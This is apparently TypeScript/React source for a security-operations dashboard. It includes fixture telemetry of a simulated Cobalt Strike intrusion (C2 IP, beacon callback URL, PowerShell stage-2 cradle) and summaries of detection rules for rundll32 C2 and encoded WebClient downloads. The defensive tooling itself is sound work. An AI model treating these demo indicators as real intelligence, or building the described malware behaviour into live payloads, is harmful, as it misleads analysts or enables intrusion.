    { id: 'sigma', name: 'Sigma Canonical YAML', short: 'Sigma', canParse: true, canRender: true, status: 'Ready', notes: 'Vendor-neutral detection specification with logsource, detection blocks, and timeframe.' },
    { id: 'splunk', name: 'Splunk Enterprise (SPL)', short: 'Splunk', canParse: true, canRender: true, status: 'Ready', notes: 'Supports index/sourcetype scoping, stats, eval, where, and tstats acceleration.' },
    { id: 'qradar', name: 'IBM QRadar (AQL)', short: 'QRadar', canParse: true, canRender: true, status: 'Ready', notes: 'Translates filters and aggregations to Ariel Query Language; refuses multi-step sequence joins.' },
    { id: 'elastic', name: 'Elastic Security (EQL / ES|QL)', short: 'Elastic', canParse: true, canRender: true, status: 'Ready', notes: 'Supports event category scoping, sequence by host.id, and wildcard predicates.' },
    { id: 'wazuh', name: 'Wazuh XML Rule Format', short: 'Wazuh', canParse: false, canRender: true, status: 'Ready', notes: 'Renders XML <rule> blocks with <field>, <match>, frequency, and <mitre> tags; refuses complex math.' },
    { id: 'chronicle', name: 'Google SecOps Chronicle (YARA-L 2.0)', short: 'Chronicle', canParse: true, canRender: true, status: 'Ready', notes: 'Renders events, match, outcome, and condition sections aligned to UDM fields.' },
    { id: 'crowdstrike', name: 'CrowdStrike Falcon LogScale (LQL)', short: 'CrowdStrike', canParse: true, canRender: true, status: 'Ready', notes: 'Renders Falcon event_simpleName pipelines with groupBy() and regex().' }
  ],

  ruleforgeHistory: [
    {
      id: 'v-104',
      parentId: 'v-103',
      title: 'Suspicious Rundll32 Outbound C2 & ProgramData DLL Execution',
      origin: 'authored' as const,
      dialect: 'sentinel',
      author: 's.chen@secops.local',
      timestamp: '2026-10-14 11:52 UTC',
      severity: 'critical',
      diffSummary: 'Added DestinationIp == 198.51.100.45 OR CommandLine contains sync_helper.dll correlation stage'
    },
    {
      id: 'v-103',
      parentId: 'v-102',
      title: 'Suspicious Rundll32 Network Connection to Non-Standard Host',
      origin: 'imported' as const,
      dialect: 'sigma',
      author: 'Event Analyzer Pivot',
      timestamp: '2026-10-14 11:46 UTC',
      severity: 'critical',
      diffSummary: 'Imported Sigma rule SIG-001 from Event Analyzer investigation DC01 & WKS-FINANCE04'
    },
    {
      id: 'v-102',
      parentId: 'v-101',
      title: 'PowerShell Encoded WebClient Stage-2 Download',
      origin: 'synthesized' as const,
      dialect: 'splunk',
      author: 'RuleForge Log Synthesizer',
      timestamp: '2026-10-14 10:15 UTC',
      severity: 'high',
      diffSummary: 'Auto-synthesized from 4 Sysmon & PowerShell 4104 JSONL events; pinned CommandLine and Image'
    },
    {
      id: 'v-101',
      parentId: null,
      title: 'Baseline Unsigned Rundll32 Execution',
      origin: 'authored' as const,
      dialect: 'sigma',
      author: 's.chen@secops.local',
      timestamp: '2026-10-13 17:30 UTC',
      severity: 'medium',
      diffSummary: 'Initial base rule creation'
    }
  ],

  initialActivityFeed: [
    {
      id: 'act-1',
      tool: 'malware' as ToolId,
      actionType: 'Binary Scan',
      description: 'invoice_q3.exe scanned — Cobalt Strike / AsyncRAT Beacon identified (52/71 engines)',
      timestamp: '2026-10-14 11:42 UTC',
      verdict: 'malicious' as VerdictType,
      scoreText: 'CRITICAL (87/100)',
      severity: 'critical' as const,
      targetSubTab: 'dashboard',
      unread: true
    },
    {
      id: 'act-2',
      tool: 'ioc' as ToolId,
      actionType: 'IOC Enrichment',
      description: '198.51.100.45 enriched across 28/33 sources — Active C2 & LummaC2 exfil node',
      timestamp: '2026-10-14 11:44 UTC',
      verdict: 'malicious' as VerdictType,
      scoreText: 'Malicious (92/100)',
      severity: 'critical' as const,
      targetSubTab: 'lookup',
      unread: true
    },
    {
      id: 'act-3',
      tool: 'events' as ToolId,
      actionType: 'EVTX Ingestion',
      description: 'DC01 & WKS-FINANCE04-Sysmon.evtx indexed — 24,891 events · 5 Sigma rules triggered',
      timestamp: '2026-10-14 11:50 UTC',
      verdict: 'malicious' as VerdictType,
      scoreText: '74 Sigma Hits',
      severity: 'critical' as const,
      targetSubTab: 'sigma',
      unread: true
    },
    {
      id: 'act-4',
      tool: 'phishing' as ToolId,
      actionType: 'Email Forensics',
      description: 'URGENT: Q3 Wire Transfer (#INV-99412) analyzed — DMARC Fail + C2 Hop + EXE Dropper',
      timestamp: '2026-10-14 11:38 UTC',
      verdict: 'malicious' as VerdictType,
      scoreText: 'UNSAFE (9.2/10)',
      severity: 'critical' as const,
      targetSubTab: 'dashboard',
      unread: false
    },
    {
      id: 'act-5',
      tool: 'ruleforge' as ToolId,
      actionType: 'Rule Translation',
      description: 'SIG-001 compiled to Sentinel KQL & Splunk SPL — 1 Wazuh sequence refusal flagged',
      timestamp: '2026-10-14 11:52 UTC',
      verdict: 'suspicious' as VerdictType,
      scoreText: 'v-104 Saved',
      severity: 'medium' as const,
      targetSubTab: 'author',
      unread: false
    },
    {
      id: 'act-6',
      tool: 'malware' as ToolId,
      actionType: 'Binary Scan',
      description: 'updater_svc.dll scanned — Unsigned DLL side-loading candidate on WKS-DEV09',
      timestamp: '2026-10-14 09:15 UTC',
      verdict: 'suspicious' as VerdictType,
      scoreText: 'MEDIUM (54/100)',
      severity: 'medium' as const,
      targetSubTab: 'static',
      unread: false
    }
  ]
};
// ============================================================================
// 4. SAFE STORAGE, CLIPBOARD & UNIFIED API CLIENT (Sections 19 & 20)
// ============================================================================
function safeLocalGet<T>(key: string, fallback: T): T {
  try {
    const raw = window.localStorage.getItem(key);
    return raw ? (JSON.parse(raw) as T) : fallback;
  } catch {
    return fallback;
  }
}

function safeLocalSet(key: string, value: unknown): void {
  try {
    window.localStorage.setItem(key, JSON.stringify(value));
  } catch {
    // Ignore quota or sandboxed iframe storage blocks
  }
}

function safeSessionGet<T>(key: string, fallback: T): T {
  try {
    const raw = window.sessionStorage.getItem(key);
    return raw ? (JSON.parse(raw) as T) : fallback;
  } catch {
    return fallback;
  }
}

function safeSessionSet(key: string, value: unknown): void {
  try {
    window.sessionStorage.setItem(key, JSON.stringify(value));
  } catch {
    // Ignore quota or sandboxed iframe storage blocks
  }
}

function copyTextToClipboard(text: string, onDone?: () => void): void {
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => {
        if (onDone) onDone();
      }).catch(() => {
        fallbackCopy(text, onDone);
      });
      return;
    }
  } catch {
    // Fallback below
  }
  fallbackCopy(text, onDone);
}

function fallbackCopy(text: string, onDone?: () => void): void {
  try {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  } catch {
    // Ignore if blocked
  }
  if (onDone) onDone();
}

function downloadFileBlob(filename: string, content: string, mimeType = 'application/json'): void {
  try {
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  } catch {
    // Fallback handled via toast
  }
}

// Unified API Client (Section 20) — Supports Live Proxy Mode & Fixture Mode
export class SecConfluxApiClient {
  public useFixtures: boolean = safeLocalGet('secconflux.useFixtures', true);
  public backends: Record<ToolId, { baseUrl: string; port: number; type: 'rest' | 'sse' | 'websocket' }> = safeLocalGet('secconflux.backends', {
    malware: { baseUrl: 'http://127.0.0.1:5000', port: 5000, type: 'websocket' },
    ioc: { baseUrl: 'http://127.0.0.1:8000', port: 8000, type: 'sse' },
    events: { baseUrl: 'http://127.0.0.1:5001', port: 5001, type: 'rest' },
    phishing: { baseUrl: 'http://127.0.0.1:5002', port: 5002, type: 'rest' },
    ruleforge: { baseUrl: 'http://127.0.0.1:8765', port: 8765, type: 'rest' }
  });

  async healthCheck(tool: ToolId): Promise<{ status: 'online' | 'offline'; latencyMs: number; mode: 'fixture' | 'live'; version: string }> {
    const versions: Record<ToolId, string> = {
      malware: '2.4.1-flask-yara',
      ioc: '3.1.0-fastapi-sse',
      events: '2.2.0-evtx-fts5',
      phishing: '2.0.8-rfc822-ml',
      ruleforge: '1.9.4-ir-3val'
    };
    if (this.useFixtures) {
      return { status: 'online', latencyMs: 12 + Math.floor(Math.random() * 18), mode: 'fixture', version: versions[tool] };
    }
    const start = performance.now();
    try {
      const endpoint = [this.backends[tool].baseUrl, '/api/health'].join('');
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 2500);
      const res = await fetch(endpoint, { signal: controller.signal });
      clearTimeout(timer);
      if (res.ok) {
        return { status: 'online', latencyMs: Math.round(performance.now() - start), mode: 'live', version: versions[tool] };
      }
    } catch {
      // Fall back gracefully
    }
    return { status: 'offline', latencyMs: Math.round(performance.now() - start), mode: 'live', version: versions[tool] };
  }
}

export const apiClient = new SecConfluxApiClient();

// ============================================================================
// 5. CUSTOM INLINE SVG ICON SYSTEM (Section 1 & 2 — Zero External Icon Deps)
// ============================================================================
export const BrandShieldIcon: React.FC<{ className?: string; size?: number }> = ({ className = '', size = 24 }) => (
  <svg width={size} height={size} viewBox="0 0 32 32" fill="none" className={className} aria-hidden="true">
    <defs>
      <linearGradient id="scShieldGrad" x1="0" y1="0" x2="32" y2="32" gradientUnits="userSpaceOnUse">
        <stop offset="0%" stopColor="var(--accent-from)" />
        <stop offset="100%" stopColor="var(--accent-to)" />
      </linearGradient>
    </defs>
    <path d="M16 2.5L4.5 7.2V15.8C4.5 23.1 9.4 29.4 16 31.5C22.6 29.4 27.5 23.1 27.5 15.8V7.2L16 2.5Z" stroke="url(#scShieldGrad)" strokeWidth="2.2" fill="rgba(99,102,241,0.10)" />
    {/* 5 converging streams into central nexus */}
    <path d="M8 10L16 16M24 10L16 16M7 18L16 16M25 18L16 16M16 26L16 16" stroke="url(#scShieldGrad)" strokeWidth="1.7" strokeLinecap="round" />
    <circle cx="16" cy="16" r="3.2" fill="url(#scShieldGrad)" />
  </svg>
);

export const ToolIcon: React.FC<{ tool: ToolId | 'home' | 'dashboard'; size?: number; className?: string }> = ({ tool, size = 18, className = '' }) => {
  switch (tool) {
    case 'malware':
      // Microscope / Binary Dissection Icon
      return (
        <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true">
          <path d="M6 18h8" />
          <path d="M3 21h18" />
          <path d="M14 21v-4a2 2 0 0 0-2-2H9" />
          <path d="M14 7l-3.5 3.5" />
          <rect x="12" y="2" width="6" height="6" rx="1" transform="rotate(45 15 5)" />
          <path d="M14 11a5 5 0 0 1 5 5v2" />
        </svg>
      );
    case 'ioc':
      // Magnifying Glass with Crosshair Icon
      return (
        <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true">
          <circle cx="10.5" cy="10.5" r="7.5" />
          <path d="M21 21l-5.2-5.2" />
          <path d="M10.5 6.5v8M6.5 10.5h8" />
          <circle cx="10.5" cy="10.5" r="2" />
        </svg>
      );
    case 'events':
      // Log / Timeline Scroll Icon
      return (
        <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true">
          <rect x="3" y="3" width="18" height="18" rx="2.5" />
          <path d="M7 8h3M13 8h4M7 12h2M12 12h5M7 16h4M14 16h3" />
        </svg>
      );
    case 'phishing':
      // Email Shield / Hook-Catch Icon
      return (
        <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true">
          <rect x="2" y="4" width="20" height="16" rx="2.5" />
          <path d="M22 7l-10 6L2 7" />
          <path d="M16 15a2.5 2.5 0 0 0 5 0v-3" />
        </svg>
      );
    case 'ruleforge':
      // Anvil / Hammer-on-Code Icon
      return (
        <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true">
          <path d="M14.5 4.5l5 5-9.5 9.5-5-5 9.5-9.5z" />
          <path d="M4 20h16" />
          <path d="M12 3L9 6" />
          <path d="M18 12l3-3" />
        </svg>
      );
    case 'dashboard':
      return (
        <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true">
          <rect x="3" y="3" width="7" height="9" rx="1.5" />
          <rect x="14" y="3" width="7" height="5" rx="1.5" />
          <rect x="14" y="12" width="7" height="9" rx="1.5" />
          <rect x="3" y="16" width="7" height="5" rx="1.5" />
        </svg>
      );
    default:
      return <BrandShieldIcon size={size} className={className} />;
  }
};

// ============================================================================
// 6. SHARED UI COMPONENT LIBRARY (Section 22 — src/ui/ components)
// ============================================================================
export const Kbd: React.FC<{ children: React.ReactNode }> = ({ children }) => (
  <kbd
    className="sc-mono inline-flex items-center justify-center px-1.5 py-0.5 text-[11px] font-medium rounded border"
    style={{
      backgroundColor: 'var(--color-surface-raised)',
      borderColor: 'var(--color-border)',
      color: 'var(--color-text-secondary)'
    }}
  >
    {children}
  </kbd>
);

export const VerdictBadge: React.FC<{ verdict: VerdictType | string; label?: string; size?: 'sm' | 'md' | 'lg' }> = ({
  verdict,
  label,
  size = 'sm'
}) => {
  const norm = verdict.toLowerCase();
  let color = 'var(--color-unknown)';
  let bg = 'var(--color-unknown-bg)';
  let text = label || verdict.toUpperCase();

  if (norm === 'malicious' || norm === 'critical' || norm === 'unsafe' || norm === 'fail') {
    color = 'var(--color-malicious)';
    bg = 'var(--color-malicious-bg)';
    if (!label && norm === 'malicious') text = 'MALICIOUS';
  } else if (norm === 'suspicious' || norm === 'medium' || norm === 'high' || norm === 'cautious' || norm === 'mismatch' || norm === 'no_match') {
    color = 'var(--color-suspicious)';
    bg = 'var(--color-suspicious-bg)';
  } else if (norm === 'clean' || norm === 'low' || norm === 'safe' || norm === 'pass' || norm === 'matched' || norm === 'match') {
    color = 'var(--color-clean)';
    bg = 'var(--color-clean-bg)';
  } else if (norm === 'info' || norm === 'informational') {
    color = 'var(--color-info)';
    bg = 'var(--color-info-bg)';
  }

  const padding = size === 'lg' ? 'px-3 py-1 text-xs' : size === 'md' ? 'px-2.5 py-0.5 text-xs' : 'px-2 py-0.5 text-[11px]';

  return (
    <span
      className={`sc-mono inline-flex items-center gap-1.5 font-semibold rounded-full uppercase tracking-wider ${padding}`}
      style={{ color, backgroundColor: bg, border: `1px solid ${color}` }}
    >
      <span className="w-1.5 h-1.5 rounded-full" style={{ backgroundColor: color }} />
      {text}
    </span>
  );
};

export const ScoreRing: React.FC<{ score: number; max?: number; size?: number; label?: string }> = ({
  score,
  max = 100,
  size = 80,
  label
}) => {
  const ratio = Math.max(0, Math.min(1, score / max));
  const pct = Math.round(ratio * 100);
  const strokeWidth = size >= 100 ? 8 : 6;
  const radius = (size - strokeWidth * 2) / 2;
  const circumference = 2 * Math.PI * radius;
  const offset = circumference - ratio * circumference;

  let strokeColor = 'var(--color-clean)';
  if (pct >= 70) strokeColor = 'var(--color-malicious)';
  else if (pct >= 20) strokeColor = 'var(--color-suspicious)';

  return (
    <div className="relative inline-flex items-center justify-center shrink-0" style={{ width: size, height: size }}>
      <svg width={size} height={size} className="-rotate-90">
        <circle
          cx={size / 2}
          cy={size / 2}
          r={radius}
          fill="transparent"
          stroke="var(--color-border)"
          strokeWidth={strokeWidth}
        />
        <circle
          cx={size / 2}
          cy={size / 2}
          r={radius}
          fill="transparent"
          stroke={strokeColor}
          strokeWidth={strokeWidth}
          strokeDasharray={circumference}
          strokeDashoffset={offset}
          strokeLinecap="round"
          style={{ transition: 'stroke-dashoffset 350ms cubic-bezier(0.16, 1, 0.3, 1)' }}
        />
      </svg>
      <div className="absolute inset-0 flex flex-col items-center justify-center text-center">
        <span className="sc-mono font-bold text-sm leading-none" style={{ color: strokeColor }}>
          {score}
          <span className="text-[10px] opacity-70">/{max}</span>
        </span>
        {label && (
          <span className="text-[9px] uppercase tracking-wider mt-0.5" style={{ color: 'var(--color-text-secondary)' }}>
            {label}
          </span>
        )}
      </div>
    </div>
  );
};

export const Sparkline: React.FC<{ values: number[]; color?: string }> = ({ values, color = 'var(--accent-from)' }) => {
  const max = Math.max(...values, 1);
  const min = Math.min(...values, 0);
  const range = Math.max(max - min, 1);
  const width = 104;
  const height = 30;
  const coords = values.map((v, idx) => {
    const x = (idx / Math.max(values.length - 1, 1)) * (width - 8) + 4;
    const y = height - 4 - ((v - min) / range) * (height - 8);
    return { x, y };
  });
  const pts = coords.map((c) => `${c.x.toFixed(1)},${c.y.toFixed(1)}`).join(' ');
  const areaPts = `4,${height - 2} ${pts} ${width - 4},${height - 2}`;
  const last = coords[coords.length - 1] || { x: width - 4, y: height / 2 };

  return (
    <svg width={width} height={height} viewBox={`0 0 ${width} ${height}`} className="overflow-visible" aria-hidden="true">
      <polygon fill={color} fillOpacity="0.16" points={areaPts} />
      <polyline fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" points={pts} />
      <circle cx={last.x} cy={last.y} r="3" fill={color} className="animate-pulse" />
    </svg>
  );
};

export const CopyKV: React.FC<{
  label: string;
  value: string;
  mono?: boolean;
  onCopy?: (val: string) => void;
  onPivot?: (val: string) => void;
  pivotLabel?: string;
}> = ({ label, value, mono = true, onCopy, onPivot, pivotLabel }) => (
  <div
    className="flex items-center justify-between gap-3 py-2 px-3 rounded-md border text-xs"
    style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
  >
    <span className="font-medium shrink-0" style={{ color: 'var(--color-text-secondary)' }}>
      {label}
    </span>
    <div className="flex items-center gap-2 min-w-0">
      <span className={`${mono ? 'sc-mono' : ''} truncate select-all`} style={{ color: 'var(--color-text-primary)' }} title={value}>
        {value}
      </span>
      {onCopy && (
        <button
          type="button"
          onClick={() => onCopy(value)}
          className="px-1.5 py-0.5 rounded text-[10px] font-medium border hover:opacity-90 shrink-0"
          style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}
          title="Copy value"
        >
          Copy
        </button>
      )}
      {onPivot && (
        <button
          type="button"
          onClick={() => onPivot(value)}
          className="px-1.5 py-0.5 rounded text-[10px] font-semibold shrink-0 sc-accent-bg"
          style={{ color: '#ffffff' }}
        >
          {pivotLabel || 'Pivot →'}
        </button>
      )}
    </div>
  </div>
);

export const Modal: React.FC<{
  open: boolean;
  title: string;
  subtitle?: string;
  onClose: () => void;
  maxWidth?: string;
  children: React.ReactNode;
}> = ({ open, title, subtitle, onClose, maxWidth = 'max-w-xl', children }) => {
  if (!open) return null;
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm"
      role="dialog"
      aria-modal="true"
      aria-label={title}
      onClick={onClose}
    >
      <div
        className={`w-full ${maxWidth} rounded-xl sc-surface-raised sc-modal-enter shadow-2xl overflow-hidden`}
        onClick={(e) => e.stopPropagation()}
      >
        <div
          className="flex items-center justify-between px-5 py-3.5 border-b"
          style={{ borderColor: 'var(--color-border)' }}
        >
          <div>
            <h3 className="text-base font-semibold" style={{ color: 'var(--color-text-primary)' }}>
              {title}
            </h3>
            {subtitle && (
              <p className="text-xs mt-0.5" style={{ color: 'var(--color-text-secondary)' }}>
                {subtitle}
              </p>
            )}
          </div>
          <button
            type="button"
            onClick={onClose}
            className="w-7 h-7 rounded-lg flex items-center justify-center text-sm hover:opacity-80"
            style={{ backgroundColor: 'var(--color-surface)', color: 'var(--color-text-secondary)' }}
            aria-label="Close modal"
          >
            ✕
          </button>
        </div>
        <div className="p-5 max-h-[80vh] overflow-y-auto">{children}</div>
      </div>
    </div>
  );
};

export const ToolOverviewTemplate: React.FC<{
  tool: ToolDefinition;
  stats: { label: string; value: string }[];
  doesList: string[];
  doesNotList: string[];
  terminalTitle: string;
  terminalOutput: string;
  ctaLabel: string;
  onStart: () => void;
}> = ({ tool, stats, doesList, doesNotList, terminalTitle, terminalOutput, ctaLabel, onStart }) => (
  <div className="space-y-6 max-w-6xl mx-auto">
    <div className="rounded-xl p-6 sc-surface sc-glow relative overflow-hidden">
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
        <div className="space-y-2 max-w-2xl">
          <div className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full text-xs font-semibold sc-accent-bg text-white">
            <ToolIcon tool={tool.id} size={14} />
            <span>{tool.name} Engine</span>
          </div>
          <h1 className="text-2xl font-bold tracking-tight">{tool.tagline}</h1>
          <p className="text-sm leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
            {tool.description}
          </p>
        </div>
        <div className="flex flex-wrap items-center gap-3">
          <button
            type="button"
            onClick={onStart}
            className="px-5 py-2.5 rounded-lg text-sm font-semibold text-white sc-accent-bg shadow-lg hover:opacity-95 transition cursor-pointer"
          >
            {ctaLabel}
          </button>
        </div>
      </div>

      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-6">
        {stats.map((st, i) => (
          <div
            key={i}
            className="p-3.5 rounded-lg border"
            style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
          >
            <div className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
              {st.label}
            </div>
            <div className="sc-mono text-lg font-bold mt-1">{st.value}</div>
          </div>
        ))}
      </div>
    </div>

    <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
      <div className="rounded-xl p-5 sc-surface space-y-3">
        <h2 className="text-sm font-semibold uppercase tracking-wider" style={{ color: 'var(--color-clean)' }}>
          ✓ What {tool.shortName} Does
        </h2>
        <ul className="space-y-2 text-xs leading-relaxed" style={{ color: 'var(--color-text-primary)' }}>
          {doesList.map((item, idx) => (
            <li key={idx} className="flex items-start gap-2">
              <span style={{ color: 'var(--color-clean)' }}>●</span>
              <span>{item}</span>
            </li>
          ))}
        </ul>
      </div>

      <div className="rounded-xl p-5 sc-surface space-y-3">
        <h2 className="text-sm font-semibold uppercase tracking-wider" style={{ color: 'var(--color-suspicious)' }}>
          ⚠ Operational Scope & Guardrails (What It Does NOT Do)
        </h2>
        <ul className="space-y-2 text-xs leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
          {doesNotList.map((item, idx) => (
            <li key={idx} className="flex items-start gap-2">
              <span style={{ color: 'var(--color-suspicious)' }}>●</span>
              <span>{item}</span>
            </li>
          ))}
        </ul>
      </div>
    </div>

    <div className="rounded-xl overflow-hidden sc-surface">
      <div
        className="flex items-center justify-between px-4 py-2.5 border-b text-xs sc-mono"
        style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
      >
        <div className="flex items-center gap-2">
          <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
          <span className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
          <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
          <span className="ml-2" style={{ color: 'var(--color-text-secondary)' }}>
            {terminalTitle}
          </span>
        </div>
        <span style={{ color: 'var(--color-text-tertiary)' }}>READ-ONLY SAMPLE TELEMETRY</span>
      </div>
      <pre
        className="p-4 text-xs sc-mono overflow-x-auto leading-relaxed"
        style={{ backgroundColor: 'var(--color-canvas)', color: 'var(--color-text-primary)' }}
      >
        {terminalOutput}
      </pre>
    </div>
  </div>
);
// ============================================================================
// 7. LANDING PAGE (Section 6) & FIRST-RUN 7-SLIDE TOUR MODAL
// ============================================================================
const TOUR_SLIDES = [
  {
    step: 1,
    title: 'Welcome to SecConflux 2.0',
    badge: 'UNIFIED SECOPS PLATFORM',
    body: 'SecConflux converges five standalone security engines—Malware Analyzer, IOC Lookup, Event Analyzer, Phishing Detector, and RuleForge—into a single, dark-first analyst workspace with zero tab switching.'
  },
  {
    step: 2,
    title: 'The Unified Command Center Dashboard',
    badge: 'MORNING BRIEFING (#/dashboard)',
    body: 'Start your shift in the Command Center: inspect 7-day threat posture sparklines across all 5 engines, triage prioritized Critical Findings, correlate overlapping IOCs across tools, and export unified activity logs.'
  },
  {
    step: 3,
    title: 'Two-Tier Navigation Architecture',
    badge: 'ROW 1 MAIN TABS · ROW 2 SUB-TABS',
    body: 'Every tool shares a predictable 2-tab primary bar: Tab 1 (Overview) and Tab 2 (Working Surface: Investigation / Lookup / Analysis / Workshop). When on Tab 2, contextual sub-tab chips appear in Row 2.'
  },
  {
    step: 4,
    title: 'Cross-Tool Pivoting & Return Breadcrumbs',
    badge: 'CONVERGE & CORRELATE',
    body: 'Click any indicator (IP, domain, SHA-256 hash, email, or Sigma rule) to pivot directly into another tool with pre-populated queries—complete with a one-click breadcrumb banner to return to your prior investigation.'
  },
  {
    step: 5,
    title: 'Shared Cross-Tool IOC Clipboard',
    badge: 'FLOATING CLIPBOARD (BOTTOM RIGHT)',
    body: 'Pin indicators from any engine into your session-persistent IOC Clipboard (up to 50 items, FIFO). Send all pinned indicators to IOC Batch Lookup or hunt across Windows EVTX logs in one click.'
  },
  {
    step: 6,
    title: 'Global Command Palette & Power Hotkeys',
    badge: 'CTRL+K / CMD+K',
    body: 'Press Ctrl+K (or Cmd+K) from anywhere to launch the Command Palette. Use keys 0–5 when no input is focused to jump directly between Home and the 5 engines, or press ? to reopen this guide.'
  },
  {
    step: 7,
    title: 'Ready to Investigate',
    badge: 'GET STARTED',
    body: 'All five engines are pre-loaded with correlated intrusion telemetry (Cobalt Strike C2 198.51.100.45 & invoice_q3.exe) and can be switched between Fixture Demo Mode and Live Backend Proxy Mode in Settings.'
  }
];

export const FirstRunTourModal: React.FC<{
  open: boolean;
  onClose: () => void;
  onNavigate: (page: PageRouteId, mainTab?: string, subTab?: string) => void;
}> = ({ open, onClose, onNavigate }) => {
  const [slideIdx, setSlideIdx] = useState(0);
  if (!open) return null;
  const slide = TOUR_SLIDES[slideIdx];

  return (
    <Modal
      open={open}
      title={`Platform Tour (${slide.step} of ${TOUR_SLIDES.length})`}
      subtitle="SecConflux 2.0 Interactive Analyst Walkthrough"
      onClose={onClose}
      maxWidth="max-w-lg"
    >
      <div className="space-y-4">
        <div className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full text-[11px] font-semibold sc-accent-bg text-white">
          <span>Slide {slide.step}/7</span>
          <span>·</span>
          <span>{slide.badge}</span>
        </div>
        <h4 className="text-lg font-bold">{slide.title}</h4>
        <p className="text-sm leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
          {slide.body}
        </p>

        <div className="flex items-center gap-1.5 pt-2">
          {TOUR_SLIDES.map((_, i) => (
            <button
              key={i}
              type="button"
              onClick={() => setSlideIdx(i)}
              className="h-1.5 rounded-full transition-all cursor-pointer"
              style={{
                width: i === slideIdx ? '28px' : '10px',
                backgroundColor: i === slideIdx ? 'var(--accent-from)' : 'var(--color-border)'
              }}
              aria-label={`Go to slide ${i + 1}`}
            />
          ))}
        </div>

        <div className="flex items-center justify-between pt-4 border-t" style={{ borderColor: 'var(--color-border)' }}>
          <button
            type="button"
            onClick={onClose}
            className="text-xs font-medium hover:underline cursor-pointer"
            style={{ color: 'var(--color-text-secondary)' }}
          >
            Skip Tour
          </button>
          <div className="flex items-center gap-2">
            {slideIdx > 0 && (
              <button
                type="button"
                onClick={() => setSlideIdx(slideIdx - 1)}
                className="px-3 py-1.5 rounded-lg text-xs font-medium border cursor-pointer"
                style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              >
                ← Back
              </button>
            )}
            {slideIdx < TOUR_SLIDES.length - 1 ? (
              <button
                type="button"
                onClick={() => setSlideIdx(slideIdx + 1)}
                className="px-4 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer"
              >
                Next →
              </button>
            ) : (
              <button
                type="button"
                onClick={() => {
                  onClose();
                  onNavigate('dashboard');
                }}
                className="px-4 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer"
              >
                Open Command Center →
              </button>
            )}
          </div>
        </div>
      </div>
    </Modal>
  );
};

export const LandingPage: React.FC<{
  activityFeed: ActivityItem[];
  onNavigate: (page: PageRouteId, mainTab?: string, subTab?: string) => void;
  onOpenTour: () => void;
  onQuickIocLookup: (ioc: string) => void;
  onTriggerUploadModal: (tool: ToolId) => void;
}> = ({ activityFeed, onNavigate, onOpenTour, onQuickIocLookup, onTriggerUploadModal }) => {
  const [selectedDemoStep, setSelectedDemoStep] = useState<number>(0);
  const [quickIocInput, setQuickIocInput] = useState('198.51.100.45');

  const evidenceSteps = [
    {
      step: '1. Malware Analyzer',
      tool: 'malware' as ToolId,
      mainTab: 'investigation',
      subTab: 'iocs',
      headline: 'Flagged in invoice_q3.exe Scan',
      badge: 'CRITICAL 87/100',
      detail: 'Extracted from PE `.rsrc` Cobalt Strike configuration & sandbox `rundll32.exe` HTTPS beacon callback to `https://198.51.100.45:443/api/v2/telemetry/checkin`.'
    },
    {
      step: '2. IOC Lookup',
      tool: 'ioc' as ToolId,
      mainTab: 'lookup',
      subTab: 'lookup',
      headline: 'Enriched Across 28/33 Intel Sources',
      badge: 'MALICIOUS 92/100',
      detail: '19/28 sources voted Malicious. AbuseIPDB 99% confidence (318 reports), Shodan port 50050 + Cobalt Strike JA3S fingerprint, and 14 Hudson Rock LummaC2 logs.'
    },
    {
      step: '3. Event Analyzer',
      tool: 'events' as ToolId,
      mainTab: 'investigation',
      subTab: 'events',
      headline: 'Found in 47 Windows Sysmon Events',
      badge: '47 EVTX HITS',
      detail: 'Matched in `WKS-FINANCE04-Sysmon.evtx` (Event ID 3 NetworkConnect from `rundll32.exe` PID 6104) and correlated with PowerShell Event ID 4104 stage-2 cradle.'
    },
